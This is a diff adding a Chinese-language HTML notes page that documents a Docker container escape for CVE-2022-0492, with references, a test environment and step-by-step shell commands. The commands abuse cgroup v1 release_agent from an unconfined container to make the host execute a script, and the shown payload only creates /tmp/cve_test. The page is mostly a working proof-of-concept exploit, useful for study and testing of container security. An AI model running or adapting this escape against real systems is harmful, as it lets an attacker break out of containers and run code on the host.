@@ -1,0 +1,40 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head><script type="text/javascript" src="../page_head.js"></script>
+
+<h3><a href="../system.htm">系統</a> - Docker - Container Escape - <b>CVE-2022-0492</b></h3>
+<hr size="1"><br>
+<p>
+參考資訊：<br>
+https://github.com/chenaotian/CVE-2022-0492<br>
+https://download.docker.com/linux/ubuntu/dists/focal/pool/stable/amd64/containerd.io_1.2.13-2_amd64.deb<br>
+https://download.docker.com/linux/ubuntu/dists/focal/pool/stable/amd64/docker-ce_19.03.10~3-0~ubuntu-focal_amd64.deb<br>
+https://download.docker.com/linux/ubuntu/dists/focal/pool/stable/amd64/docker-ce-cli_19.03.10~3-0~ubuntu-focal_amd64.deb<br><br>
+
+<b>測試環境</b>：<br>
+Ubuntu 20.04 (5.4.0-21-generic)<br>
+Docker version 19.03.10, build 9424aeaee9<br><br>
+
+<b>測試步驟</b>：
+</p>
+<pre>
+$ sudo docker run --rm -it --security-opt apparmor=unconfined --security-opt seccomp=unconfined ubuntu:22.04 /bin/bash
+cve:/# unshare -UrmC --propagation=unchanged bash
+cve:/# mkdir /tmp/test
+cve:/# mount -t cgroup -o rdma cgroup /tmp/test
+cve:/# mkdir /tmp/test/x 
+cve:/# echo 1 &gt; /tmp/test/x/notify_on_release
+cve:/# echo '#!/bin/sh' &gt; /cmd
+cve:/# echo "touch /tmp/cve_test" &gt;&gt; /cmd
+cve:/# chmod 0777 /cmd
+cve:/# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+cve:/# echo "$host_path/cmd" &gt; /tmp/test/release_agent
+cve:/# sh -c "echo \$\$ &gt; /tmp/test/x/cgroup.procs"
+cve:/# exit
+cve:/# exit
+
+# ls /tmp
+    cve_test
+</pre>
+
+<br><script type="text/javascript" src="../tail.js"></script>
